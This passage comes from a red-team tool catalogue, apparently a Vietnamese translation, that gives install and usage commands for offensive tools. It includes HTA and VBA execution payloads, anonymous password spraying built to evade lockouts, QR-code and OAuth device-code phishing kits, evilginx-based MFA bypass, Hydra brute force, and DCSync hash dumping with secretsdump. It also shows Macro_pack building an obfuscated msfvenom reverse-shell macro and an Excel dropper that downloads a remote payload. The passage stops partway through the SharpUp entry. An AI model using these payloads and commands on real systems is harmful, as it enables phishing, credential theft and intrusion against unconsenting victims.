**Lưu ý:** Các lệnh này thực thi **script WSH**. `wscript.exe` hiển thị output trong hộp thoại GUI, `cscript.exe` hiển thị output trong console. Dòng cuối cùng cho thấy cách chỉ định engine **VBScript** cho một tệp `.txt` để bỏ qua việc chặn tệp `.vbs`.

### [🔙](#tool-list)**HTA**

**Tạo payload:**

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
**Lưu ý:** Đây là mã của một tệp **HTA** (**HTML Application**). Tệp **HTA** được xử lý bởi `mshta.exe` trên **Windows** và có quyền truy cập các đối tượng **COM** như `WScript.Shell`, cho phép thực thi lệnh hệ thống (`cmd.exe`). Nó khác với các tệp **HTML** thông thường được xử lý bởi trình duyệt với sandbox hạn chế hơn. Đây là một kỹ thuật **execution** phổ biến.

**Execute:** Run file
**Lưu ý:** Chỉ cần mở tệp `.hta` trên hệ thống **Windows**.

### [🔙](#tool-list)**VBA**

**Tạo payload:**

```python
Sub calc()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
**Lưu ý:** Đây là mã **VBA** (Visual Basic for Applications) thường được nhúng trong các tài liệu Microsoft Office (Word, Excel, PowerPoint, Access). Khi macro này được thực thi, nó tạo một đối tượng `WScript.Shell` và chạy `calc.exe`. Số `0` ở cuối lệnh `Run` làm cho cửa sổ máy tính bị ẩn.

**Execute:** Set function to Auto_Open() in macro enabled document
**Lưu ý:** Để tự động thực thi khi tài liệu được mở, tên hàm **VBA** cần là `Auto_Open()` (Word), `Auto_Actiavte()` (Excel) hoặc các hàm kích hoạt tự động khác, và người dùng phải cho phép thực thi macro khi được hỏi (hoặc nếu cài đặt bảo mật cho phép mặc định).

**Initial Access**
====================

### [🔙](#tool-list)[**CredMaster**](https://github.com/knavesec/CredMaster)

Khởi động cuộc tấn công **password spray / brute force** thông qua các proxy **Amazon AWS**, shifting the requesting IP address for every authentication attempt. This dynamically creates **FireProx APIs** for more evasive password sprays.

**CredMaster** provides a method of running anonymous password sprays against endpoints in a simple, easy to use tool. The **FireProx tool** provides the rotating request IP, while the base of **CredMaster** spoofs all other identifying information.

Features:
- Fully supports all AWS Regions
- Automatically generates APIs for proxy pass-through
- Spoofs API tracking numbers, forwarded-for IPs, and other proxy tracking headers
- Multi-threaded processing
- Password delay counters & configuration for lockout policy evasion
- Easily add new plugins
- Fully anonymous

**Install:**

```bash
git clone https://github.com/knavesec/CredMaster;cd CredMaster;pip install -r requirements.txt
```
**Lưu ý:** Cài đặt tiêu chuẩn cho hệ thống có **Git** và **Python**.

Để biết hướng dẫn cài đặt đầy đủ, xem [tại đây](https://whynotsecurity.com/blog/credmaster/#setup).

**Cách sử dụng:**

```bash
python3 credmaster.py --plugin {pluginname} --access_key {key} --secret_access_key {key} -u userfile -p passwordfile -a useragentfile {otherargs}
python3 credmaster.py --config config.json
```
**Lưu ý:** Các ví dụ sử dụng **script Python credmaster.py**. Công cụ này **bắt buộc** phải có **AWS API access keys** được cấu hình và cung cấp để có thể tạo và sử dụng các **proxy FireProx**. `-u` và `-p` thường được dùng để cung cấp tệp chứa tên người dùng và mật khẩu cho chiến dịch **password spraying**. Sử dụng tệp cấu hình JSON (`--config`) cũng là một tùy chọn.

This tool requires **AWS API access keys**, a walkthrough on how to acquire these keys can be found here: https://bond-o.medium.com/aws-pass-through-proxy-84f1f7fa4b4b

![credmaster](https://github.com/user-attachments/assets/f678cca4-7a53-41e7-9323-51e8efd0e6ba)

*Hình ảnh được sử dụng từ https://github.com/knavesec/CredMaster/wiki*

### [🔙](#tool-list)[**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray)

**TREVORspray** is a modular password sprayer with threading, SSH proxying, loot modules, and more!

**Install:**

```bash
pip install https://github.com/blacklanternsecurity/TREVORspray
```
**Lưu ý:** Cài đặt **toolkit Python** này trực tiếp từ URL **GitHub** bằng pip.

**Cách sử dụng:**

```bash
# Recon
python3 ./trevorspray --recon evilcorp.com

# Liệt kê người dùng thông qua OneDrive
python3 ./trevorspray --recon evilcorp.com -u emails.txt --threads 10

# Spray chống lại những gì đã khám phá
python3 ./trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/b43asdas-cdde-bse-ac05-2e37deadbeef/oauth2/token
```
**Lưu ý:** Các ví dụ sử dụng **script Python trevorspray**. `--recon` thực hiện các kỹ thuật **recon** (ví dụ: kiểm tra người dùng trên các dịch vụ public như **OneDrive**). `-u` và `-p` chỉ định tệp người dùng/mật khẩu cho chiến dịch spray. `--threads` kiểm soát số luồng song song. `--url` chỉ định điểm cuối xác thực mục tiêu (ở đây là điểm cuối OAuth của Microsoft).

Để biết hướng dẫn sử dụng đầy đủ, xem [tại đây](https://github.com/blacklanternsecurity/TREVORspray?tab=readme-ov-file#how-to---o365).

![TREVORspray](https://github.com/user-attachments/assets/67c64f6d-527a-4b59-8dd9-b73bc68274f4)

*Hình ảnh được sử dụng từ https://github.com/blacklanternsecurity/TREVORspray*

### [🔙](#tool-list)[**evilqr**](https://github.com/kgretzky/evilqr)

**Toolkit** demonstrates another approach of a **QRLJacking attack**, allowing to perform remote account takeover, through sign-in QR code phishing.

It consists of a browser extension used by the attacker to extract the sign-in QR code and a server application, which retrieves the sign-in QR codes to display them on the hosted phishing pages.

**Demo video** [tại đây](https://www.youtube.com/watch?v=8pfodWzqMcU)

**Cài đặt (Tiện ích mở rộng):**

You can load the extension in Chrome, through `Load unpacked` feature:
https://developer.chrome.com/docs/extensions/mv3/getstarted/development-basics/#load-unpacked

Once the extension is installed, make sure to pin its icon in Chrome's extension toolbar, so that the icon is always visible.
**Lưu ý:** Đây là quy trình cài đặt tiện ích mở rộng Chrome chưa được đóng gói, thực hiện trong cài đặt của trình duyệt Chrome.

**Cài đặt (**Server**):**

```bash
git clone https://github.com/kgretzky/evilqr;cd evilqr/server/;build_run.bat
```
**Lưu ý:** Lệnh này clone mã nguồn, di chuyển vào thư mục con server và chạy một file `.bat` (lệnh batch của **Windows**) tên `build_run.bat`, có khả năng là để build và chạy server. Thực hiện trên **Windows**.

**Cách sử dụng:**

1. Run the server by running the built server binary: `./server/build/evilqr-server`
2. Open any of the supported websites in your Chrome browser, with installed **Evil QR** extension:
```
https://discord.com/login
https://web.telegram.org/k/
https://whatsapp.com
https://store.steampowered.com/login/
https://accounts.binance.com/en/login
https://www.tiktok.com/login
```
3. Make sure the sign-in QR code is visible and click the **Evil QR** extension icon in the toolbar. If the QR code is recognized, the icon should light up with colors.
4. Open the server's phishing page URL: `http://127.0.0.1:35000` (default)
**Lưu ý:** Quy trình tấn công chi tiết: Chạy server (trên máy attacker), dùng tiện ích mở rộng để bắt mã QR đăng nhập từ webiste hợp pháp (mà attacker đang truy cập), sau đó dụ nạn nhân truy cập trang phishing do attacker host (trên máy attacker) để hiển thị mã QR đã bắt. Khi nạn nhân quét mã QR này, họ sẽ đăng nhập vào tài khoản của họ trên website hợp pháp thông qua thiết bị của họ (điện thoại), và **server evilqr** của attacker sẽ bắt được **session** của nạn nhân.

![evilqr](https://github.com/user-attachments/assets/00ad78c5-1978-4e59-a522-7e8b9c39b1c3)

*Hình ảnh được sử dụng từ https://breakdev.org/evilqr-phishing/*

### [🔙](#tool-list)[**CUPP**](https://github.com/Mebus/cupp)

The most common form of authentication is the combination of a username and a password or passphrase. Passwords can sometimes be guessed profiling the user, such as a birthday, nickname, address, name of a pet or relative, or a common word such as God, love, money or password.

That is why **CUPP** was born.

**Install:**

```bash
git clone https://github.com/Mebus/cupp;cd cupp
```
**Lưu ý:** Cài đặt tiêu chuẩn bằng **Git** và chuyển vào thư mục của công cụ.

**Cách sử dụng:**

```bash
# Run in interactive mode
python3 ./cupp.py -i
```
**Lưu ý:** Lệnh chạy **script Python cupp.py** ở chế độ tương tác (`-i`). Ở chế độ này, công cụ sẽ hỏi bạn một loạt câu hỏi về nạn nhân để tạo ra một **wordlist** mật khẩu dựa trên thông tin cá nhân của họ.

![cupp](https://github.com/user-attachments/assets/39ad1c58-de4e-449a-b2d4-a9629d5ab82c)

*Hình ảnh được sử dụng từ https://github.com/Mebus/cupp*

### [🔙](#tool-list)[**Bash Bunny**](https://shop.hak5.org/products/bash-bunny)

The **Bash Bunny** is a physical **USB** attack tool and multi-function **payload** delivery system. It is designed to be plugged into a computer's **USB** port and can be programmed to perform a variety of functions, including manipulating and exfiltrating data, installing malware, and bypassing security measures.

[hackinglab: **Bash Bunny** – Hướng dẫn](https://hackinglab.cz/en/blog/bash-bunny-guide/)

[Tài liệu **Hak5**](https://docs.hak5.org/bash-bunny/)

[Repo **Payload** hay](https://github.com/hak5/bashbunny-payloads)

[Trang sản phẩm](https://hak5.org/products/bash-bunny)

![image](https://user-images.githubusercontent.com/100603074/209868292-cc02ce20-7d8e-4019-b953-7082fb0eb828.png)

### [🔙](#tool-list)[**EvilGoPhish**](https://github.com/fin3ss3g0d/evilgophish)

evilginx2 + gophish. (**GoPhish**) **Gophish** is a powerful, open-source **phishing framework** that makes it easy to test your organization's exposure to **phishing**. (**evilginx2**) Standalone **man-in-the-middle** attack framework used for phishing login credentials along with **session cookies**, allowing for the bypass of **2-factor authentication**.

**Install:**

```bash
git clone https://github.com/fin3ss3g0d/evilgophish
```
**Lưu ý:** Cài đặt tiêu chuẩn bằng **Git**. Đây là một công cụ tích hợp hai công cụ phishing mạnh mẽ là **evilginx2** và **GoPhish**.

**Cách sử dụng:**

```
Usage:
./setup <root domain> <subdomain(s)> <root domain bool> <redirect url> <feed bool> <rid replacement> <blacklist bool>
 - root domain                     - tên miền gốc sẽ được sử dụng cho chiến dịch
 - subdomains                      - một danh sách các tên miền phụ của evilginx2 được phân tách bằng dấu cách, có thể chỉ có một
 - root domain bool                - true hoặc false để proxy tên miền gốc tới evilginx2
 - redirect url                    - URL để chuyển hướng các yêu cầu Apache trái phép
 - feed bool                       - true hoặc false nếu bạn định sử dụng live feed
 - rid replacement                 - thay thế "rid" mặc định của gophish trong các URL phishing bằng giá trị này
 - blacklist bool                  - true hoặc false để sử dụng blacklist của Apache
Example:
  ./setup.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false
```
**Lưu ý:** Ví dụ về cách chạy **script setup.sh** để cấu hình tích hợp **evilginx2** và **GoPhish** cho một chiến dịch cụ thể, với nhiều tham số khác nhau kiểm soát cách thức hoạt động của **phishing**.

![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)

### [🔙](#tool-list)[**The Social-Engineer Toolkit** (SET)](https://github.com/IO1337/social-engineering-toolkit)

This framework is great for creating campaigns for **initial access**, '**SET** has a number of custom **attack vectors** that allow you to make a believable attack quickly'.

**Install:**

```bash
git clone https://github.com/IO1337/social-engineering-toolkit; cd set; python setup.py install
```
**Lưu ý:** Các lệnh cài đặt từ mã nguồn trên hệ thống có **Git** và **Python**, sử dụng **script setup.py** tiêu chuẩn.

**Cách sử dụng:**

```bash
python3 setoolkit
```
**Lưu ý:** Lệnh chạy công cụ **SET** ở chế độ tương tác, hiển thị menu các tùy chọn tấn công **social engineering** khác nhau.

![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)

### [🔙](#tool-list)[**Hydra**](https://github.com/vanhauser-thc/thc-hydra)

Nice tool for logon brute force attacks. Can bf a number of services including **SSH, FTP, TELNET, HTTP** etc.

**Install:**

```bash
sudo apt install hydra
```
**Lưu ý:** Cài đặt tiêu chuẩn trên **Linux/Debian/Ubuntu** sử dụng **apt**.

**Cách sử dụng:**

```bash
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh
```
**Lưu ý:** Các ví dụ sử dụng **Hydra** cho **brute force**.
Dòng đầu tiên thực hiện **brute force** dựa trên form POST của HTTP, chỉ định file người dùng (`-L`), file mật khẩu (`-P`), IP mục tiêu và cấu trúc của form login, bao gồm cả chuỗi báo lỗi.
Dòng thứ hai thực hiện **brute force** đăng nhập **SSH** sử dụng cùng file người dùng và mật khẩu.

![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)

### [🔙](#tool-list)[**SquarePhish**](https://github.com/secureworks/squarephish)

**SquarePhish** is an advanced phishing tool that uses a technique combining **OAuth Device code authentication flow** and **QR codes** (See [PhishInSuits](https://github.com/secureworks/PhishInSuits) for more about **OAuth Device Code flow** for phishing attacks).

Attack Steps:

- Send malicious **QR code** to victim
- Victim scans **QR code** with mobile device
- Victim directed to attacker controlled server (Triggering **OAuth Device Code authentication flow** process)
- Victim emailed **MFA** code (Triggering **OAuth Device Code flow** 15 minute timer)
- Attacker polls for authentication
- Victim enters code into legit Microsoft website
- Attacker saves authentication token

**Install:**

```bash
git clone https://github.com/secureworks/squarephish; cd squarephish; pip install -r requirements.txt
```
**Lưu ý:** Cài đặt tiêu chuẩn cho hệ thống có **Git** và **Python**.

**Note:** *Before using either module, update the required information in the settings.config file noted with `Required`.*

**Cách sử dụng (Email Module):**

```
usage: squish.py email [-h] [-c CONFIG] [--debug] [-e EMAIL]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        tệp cấu hình squarephish [Mặc định: settings.config]

  --debug               cho phép debug server

  -e EMAIL, --email EMAIL
                        địa chỉ email của nạn nhân để gửi email mã QR ban đầu đến
```
**Lưu ý:** Trợ giúp sử dụng **script squish.py** với subcommand `email`.

**Cách sử dụng (Server Module):**

```
usage: squish.py server [-h] [-c CONFIG] [--debug]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        tệp cấu hình squarephish [Mặc định: settings.config]

  --debug               cho phép debug server
```
**Lưu ý:** Trợ giúp sử dụng **script squish.py** với subcommand `server`.

![image](https://user-images.githubusercontent.com/100603074/208217359-70e3ebd4-5cbf-40b9-9e4b-ca1608e4422f.png)

### [🔙](#tool-list)[**King Phisher**](https://github.com/securestate/king-phisher)

**King Phisher** is a tool that allows attackers to create and send phishing emails to victims to obtain sensitive information.

It includes features like customizable templates, campaign management, and email sending capabilities, making it a powerful and easy-to-use tool for carrying out phishing attacks. With **King Phisher**, atackers can target individuals or organizations with targeted and convincing phishing emails, increasing the chances of success in their attacks.

**Cài đặt (Linux - Client & Server):**

```bash
wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh && \
sudo bash ./install.sh
```
**Lưu ý:** Tải và thực thi **script cài đặt** trên **Linux/Debian/Ubuntu**. Yêu cầu **wget** và quyền **super user**.

**Cách sử dụng:**

Once **King Phisher** has been installed please follow the [wiki page](https://github.com/rsmusllp/king-phisher/wiki/Getting-Started) to setup **SSH, Database config, SMTP server** etc.
**Lưu ý:** **King Phisher** là một **framework phishing** có giao diện người dùng (web hoặc GUI?), yêu cầu thiết lập backend như database, server SMTP để gửi email và server để host các trang phishing. Hướng dẫn chi tiết hơn nằm trên wiki của dự án.

![image](https://user-images.githubusercontent.com/100603074/208217377-a6d36613-4ffe-486d-a630-99ed1bb7ed2d.png)

**Execution**
====================

### [🔙](#tool-list)[**Responder**](https://github.com/SpiderLabs/Responder)

**Responder** is a tool for poisoning the **LLMNR** and **NBT-NS** protocols on a network, to allow for credential capture and arbitrary code execution.

The **LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)** protocols are used by Windows systems to resolve hostnames to IP addresses on a local network. If a hostname cannot be resolved using these protocols, the system will broadcast a request for the hostname to the local network.

**Responder** listens for these broadcasts and responds with a fake IP address, tricking the requesting system into sending its credentials to the attacker.

**Install:**

```bash
git clone https://github.com/SpiderLabs/Responder#usage
cd Responder
```
**Lưu ý:** Cài đặt tiêu chuẩn bằng **Git**. Responder được viết bằng **Python**.

**Cách sử dụng:**

```bash
# Running the tool
./Responder.py [options]

# Typical usage
./Responder.py -I eth0 -wrf
```
**Lưu ý:**
`./Responder.py [options]`: Cú pháp chung để chạy script **Responder.py** với các tùy chọn khác nhau.
`./Responder.py -I eth0 -wrf`: Chạy **Responder** trên giao diện mạng `eth0`.
`-w`: Kích hoạt web server để thu thập thông tin xác thực **HTTP/HTTPS/SMB**.
`-r`: Kích hoạt bộ phận nhận **SMB/HTTP** của **Responder**.
`-f`: Buộc bộ nhận **SMB/HTTP** chuyển tiếp kết nối xác thực hợp pháp cho máy chủ gốc (không bắt buộc).
Sử dụng trên **Linux**, lắng nghe các truy vấn tên trên mạng cục bộ và trả lời giả mạo để thu thập **hash** (thường là **NTLMv2**).

Full usage information can be found [tại đây](https://github.com/SpiderLabs/Responder#usage).

![image](https://user-images.githubusercontent.com/100603074/210266150-b9cbd4a0-d07b-435a-8fa9-bc0b88d2c6ae.png)

*Hình ảnh được sử dụng từ https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/*

### [🔙](#tool-list)[**secretsdump**](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

A utility that is part of the **Impacket** library that can be used to extract password hashes and other secrets from a Windows system.

It does this by interacting with the **Security Account Manager (SAM)** database on the system and extracting the hashed passwords and other information, such as:

- Password hashes for local accounts
- Kerberos tickets and keys
- LSA Secrets

**Install:**

```bash
python3 -m pip install impacket
```
**Lưu ý:** Cài đặt thư viện **Impacket** cho **Python 3** bằng `pip`.

**Cài đặt (Với Example Scripts):**

Download and extract [gói](https://github.com/fortra/impacket), then navigate to the install folder and run...

```bash
python3 -m pip install .
```
**Lưu ý:** Cài đặt **Impacket** từ mã nguồn đã tải về để có các **script** ví dụ trong thư mục `examples`.

**Cách sử dụng:**

```bash
# Trích xuất hash NTLM với các file cục bộ
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# DCSync attack và dump các hash NTLM của tất cả người dùng domain.
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```
**Lưu ý:** **secretsdump.py** là một trong nhiều **script** tiện ích của **Impacket**.
Dòng đầu tiên: Thực hiện **dump hash** cục bộ bằng cách cung cấp đường dẫn đến file **NTDS.dit** (chứa **hash** AD) và **SYSTEM hive** (chứa khóa giải mã). Cần phải lấy được các file này từ **Domain Controller** (thường bằng các kỹ thuật khác).
Dòng thứ hai: Thực hiện cuộc tấn công **DCSync**, giả mạo là một **Domain Controller** khác và yêu cầu **DC** mục tiêu gửi lại **hash** mật khẩu của các đối tượng AD. Đây là một kỹ thuật mạnh mẽ để **dump hash** từ xa mà không cần **SysAdmin**. Yêu cầu thông tin xác thực **domain** có quyền đủ để thực hiện **DCSync** (thường là quản trị viên domain).

Bản [**cheat sheet**](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) rất hữu ích cho cách sử dụng **Impacket**.

![image](https://user-images.githubusercontent.com/100603074/210266110-8f60d6e8-009a-4dea-9e33-8a712aeaf2ac.png)

*Hình ảnh được sử dụng từ https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy*

### [🔙](#tool-list)[**evil-winrm**](https://github.com/Hackplayers/evil-winrm)

**Evil-WinRM** is a tool that provides a command line interface for **Windows Remote Management (WinRM**: *A service that allows administrators to remotely execute commands on a Windows machine*).

**Evil-WinRM** allows an attacker to remotely connect to a Windows machine using **WinRM** and execute arbitrary commands.

Some features include:

- Loading in memory **Powershell scripts**
- Loading in memory **dll files** bypassing some AVs
- Loading **x64 payloads**
- **Pass-the-hash** support
- Uploading and downloading local and remote files

**Install: (Git)**

```bash
sudo gem install winrm winrm-fs stringio logger fileutils
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
```
**Lưu ý:** Các lệnh cài đặt dependencies là gem **Ruby** (cần cài đặt **Ruby**), sau đó clone mã nguồn.

**Install: (Ruby gem)**

```bash
gem install evil-winrm
```
**Lưu ý:** Cài đặt **Evil-WinRM** như một gem **Ruby**. Phương pháp đơn giản hơn nếu đã có môi trường **Ruby**.

Alternative installation instructions can be found [tại đây](https://github.com/Hackplayers/evil-winrm#installation--quick-start-4-methods).

**Cách sử dụng:**

```bash
# Kết nối tới 192.168.1.100 với tư cách Administrator và các thư mục download exe/ps1 tùy chỉnh
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

# Tải lên các file cục bộ đến nạn nhân
upload local_filename
upload local_filename destination_filename

# Tải xuống các file từ xa về máy cục bộ
download remote_filename
download remote_filename destination_filename

# Thực thi .Net assembly vào bộ nhớ nạn nhân
Invoke-Binary /opt/csharp/Rubeus.exe

# Load DLL library vào bộ nhớ nạn nhân
Dll-Loader -http http://10.10.10.10/SharpSploit.dll
```
**Lưu ý:** Đây là các ví dụ về các lệnh được sử dụng *bên trong shell evil-winrm* sau khi đã kết nối thành công đến máy **Windows** mục tiêu thông qua **WinRM**. Bạn cần cung cấp IP, tên người dùng và mật khẩu (`-i`, `-u`, `-p`) để kết nối. Các lệnh `upload`, `download`, `Invoke-Binary`, `Dll-Loader` là các tính năng của **evil-winrm** để tương tác với hệ thống từ xa.

Full usage documentation can be found [tại đây](https://github.com/Hackplayers/evil-winrm#documentation).

![image](https://user-images.githubusercontent.com/100603074/210266192-ad53c125-7b3b-4a91-89c1-01c42cb21ef3.png)

*Hình ảnh được sử dụng từ https://korbinian-spielvogel.de/posts/heist-writeup/*

### [🔙](#tool-list)[**Donut**](https://github.com/TheWover/donut/)

A tool for in-memory execution of **VBScript, JScript, EXE, DLL** files and **dotNET assemblies**. It can be used to load and run custom **payloads** on target systems without the need to drop files to disk.

**Cài đặt: (**Windows**)**

```bash
git clone http://github.com/thewover/donut.git
```

To generate the loader template, dynamic library **donut.dll**, the static library **donut.lib** and the generator **donut.exe**. Start an x64 Microsoft Visual Studio Developer Command Prompt, change to the directory where you cloned the **Donut** repository and enter the following:

```bash
nmake -f Makefile.msvc
```
**Lưu ý:** Sử dụng `nmake` (Microsoft Program Maintenance Utility) với Makefile.msvc để build **Donut**. Yêu cầu môi trường build của **Visual Studio**.

To do the same, except using **MinGW-64** on **Windows** or **Linux**, change to the directory where you cloned the **Donut** repository and enter the following:

```bash
make -f Makefile.mingw
```
**Lưu ý:** Sử dụng `make` với Makefile.mingw để build **Donut** trên các môi trường sử dụng **MinGW-64** hoặc **Linux**.

**Cài đặt: (Linux)**

```bash
pip3 install donut-shellcode
```
**Lưu ý:** Cài đặt thư viện **Python** liên quan đến việc tạo **shellcode Donut** thông qua `pip`.

**Cách sử dụng:**

```bash
# Creating shellcode from an XSL file that pops up a calculator.
shellcode = donut.create(file=r"C:\\Tools\\Source\\Repos\\donut\\calc.xsl")

# Creating shellcode from an unmanaged DLL. Invokes DLLMain.
shellcode = donut.create(file=r"C:\Tools\Source\Repos\donut\payload\test\hello.dll")
```
**Lưu ý:** Các ví dụ này thể hiện cách sử dụng thư viện **Python** để tạo **shellcode** từ một tệp đầu vào (`calc.xsl` hoặc `hello.dll`). `donut.create()` là hàm chính để tạo **shellcode**. **Shellcode** này sau đó có thể được thực thi trong bộ nhớ bằng các kỹ thuật khác.

For full usage information, see the donut [GitHub Page](https://github.com/TheWover/donut/#4-usage).

See [a recent blog post](https://thewover.github.io/Bear-Claw/) from The Wover for more info.

![image](https://user-images.githubusercontent.com/100603074/210077893-9d42cc2f-0ea0-414f-8103-42e29429321b.png)

### [🔙](#tool-list)[**Macro_pack**](https://github.com/sevagas/macro_pack)

A tool used to automatize the obfuscation and generation of Office documents, **VB scripts**, **shortcuts**, and other formats for **red teaming**.

**Cài đặt (Binary):**

1. Get the latest binary from [https://github.com/sevagas/macro_pack/releases/](https://github.com/sevagas/macro_pack/releases/)
2. Download binary on PC with genuine Microsoft Office installed.
3. Open console, **CD** to binary dir and call the binary
**Lưu ý:** Phương pháp cài đặt bằng cách tải xuống file thực thi trực tiếp.

**Cài đặt: (Git)**

```bash
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```
**Lưu ý:** Cài đặt từ mã nguồn bằng **Git** và **Python**.

**Cách sử dụng:**

```bash
# Help Page
python3 macro_pack.py  --help

# Liệt kê tất cả các định dạng file được hỗ trợ
macro_pack.exe --listformats
# Che giấu file vba được tạo bởi msfvenom và đặt kết quả vào một file VBA mới.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

# Che giấu file VBA stager của Empire và tạo tài liệu MS Word:
macro_pack.exe -f empire.vba -o -G myDoc.docm

# Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm"

# Execute calc.exe via Dynamic Data Exchange (DDE) attack
echo calc.exe | macro_pack.exe --dde -G calc.xslx
```
**Lưu ý:** Các ví dụ về cách sử dụng **Macro_pack**. Nó có thể nhận mã nguồn VBA từ `msfvenom` thông qua piping và che giấu nó (`-o`) và xuất ra file VBA (`-G`). Nó cũng có thể nhúng dropper (`-t DROPPER`) hoặc sử dụng các kỹ thuật khác như **DDE** (`--dde`) để thực thi lệnh.

![image](https://user-images.githubusercontent.com/100603074/209868800-7fbcfdec-8ae8-4693-8438-feebc2309667.png)

### [🔙](#tool-list)[**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit)

A collection of **PowerShell scripts** and modules that can be used to achieve a variety of **red teaming objectives**.

Some of the features of **PowerSploit**:

- Dump password hashes and extract clear-text passwords from memory
- Escalate privileges and bypass security controls
- Execute arbitrary **PowerShell** code and bypass execution restrictions
- Perform network reconnaissance and discovery
- Generate **payloads** and execute **exploits**

**Install:** *1. Save to PowerShell modules folder*

First you will need to download the [Thư mục PowerSploit](https://github.com/PowerShellMafia/PowerSploit) and save it to your **PowerShell** modules folder.

Your **PowerShell** modules folder path can be found with the following command:

```
$Env:PSModulePath
```
**Lưu ý:** Biến môi trường `$Env:PSModulePath` trong **PowerShell** chứa danh sách các đường dẫn mà **PowerShell** tìm kiếm module. Bạn cần đặt thư mục **PowerSploit** đã tải về vào một trong các đường dẫn này để **PowerShell** có thể tìm thấy module.

**Install:** *2. Install PowerSploit as a PowerShell module*

You will then need to install the **PowerSploit** module (use the name of the downloaded folder).

**Note:** *Your PowerShell execution policy might block you, to fix this run the following command.*

```
powershell.exe -ep bypass
```
**Lưu ý:** Chạy **PowerShell** với tùy chọn `-ep bypass` để bỏ qua chính sách thực thi, cho phép bạn chạy các script cục bộ, ngay cả khi chúng không được ký. Cẩn trọng khi sử dụng tùy chọn này.

Now you can install the **PowerSploit** module.

```
Import-Module PowerSploit
```
**Lưu ý:** Lệnh **PowerShell** để tải và làm cho các lệnh và hàm của module **PowerSploit** có sẵn trong phiên hiện tại.

**Cách sử dụng:**

```
Get-Command -Module PowerSploit
```
**Lưu ý:** Lệnh **PowerShell** để liệt kê tất cả các lệnh (cmdlet, function, alias) được cung cấp bởi module **PowerSploit** sau khi nó được import thành công. Điều này giúp bạn khám phá các tính năng của module.

![image](https://user-images.githubusercontent.com/100603074/210267625-3135de58-df26-4e0a-9de4-741ad37d2eb9.png)

### [🔙](#tool-list)[**Rubeus**](https://github.com/GhostPack/Rubeus)

A tool that can be used to perform various actions related to Microsoft **Active Directory (AD)** environments, such as dumping password hashes, creating/deleting users, and modifying user properties.

Some of the features of **Rubeus**:

- **Kerberoasting**
- **Golden ticket** attacks
- **Silver ticket** attacks

**Install (Tải xuống):**

You can install the unofficial pre-compiled **Rubeus** binary [tại đây](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe).
**Lưu ý:** Tải xuống file `.exe` đã được biên dịch sẵn. Đây là cách dễ nhất nhưng bạn cần tin tưởng nguồn cung cấp file.

**Install (Biên dịch):**

**Rubeus** is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the rubeus [project .sln](https://github.com/GhostPack/Rubeus), choose "**Release**", and **build**.
**Lưu ý:** Cách này yêu cầu môi trường phát triển **Visual Studio** để biên dịch mã nguồn C# của **Rubeus** thành file thực thi.

**Cách sử dụng:**

```
Rubeus.exe -h
```
**Lưu ý:** Lệnh này hiển thị màn hình trợ giúp của **công cụ Rubeus**, liệt kê tất cả các lệnh và tùy chọn khác nhau mà nó hỗ trợ (ví dụ: `kerberoast`, `tge`, `renew`, `ptt`, `monitor`, ...).

![image](https://user-images.githubusercontent.com/100603074/208250015-674a6fee-95b7-4edf-bd59-fe459cd235ed.png)

### [🔙](#tool-list)[**SharpUp**](https://github.com/GhostPack/SharpUp)

A nice tool for checking a victims endpoint for vulnerabilites relating to high integrity processes, groups, hijackable paths, etc.

It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings.

**Install (Tải xuống):**

You can install the unofficial pre-compiled **SharpUp** binary [tại đây](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe).
**Lưu ý:** Tải xuống file `.exe` đã được biên dịch sẵn.

**Install (Biên dịch):**

**SharpUp** is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Open the **SharpUp** [project .sln](https://github.com/GhostPack/SharpUp), choose "**Release**", and **build**.
**Lưu ý:** Biên dịch từ mã nguồn C# bằng **Visual Studio**.

**Cách sử dụng:**

```bash
SharpUp.exe audit
#-> Chạy tất cả các kiểm tra lỗ hổng bất kể cấp độ toàn vẹn hay tư cách nhóm.

SharpUp.exe HijackablePaths
#-> Chỉ kiểm tra xem có các đường dẫn có thể sửa đổi trong biến %PATH% của người dùng hay không.

SharpUp.exe audit HijackablePaths
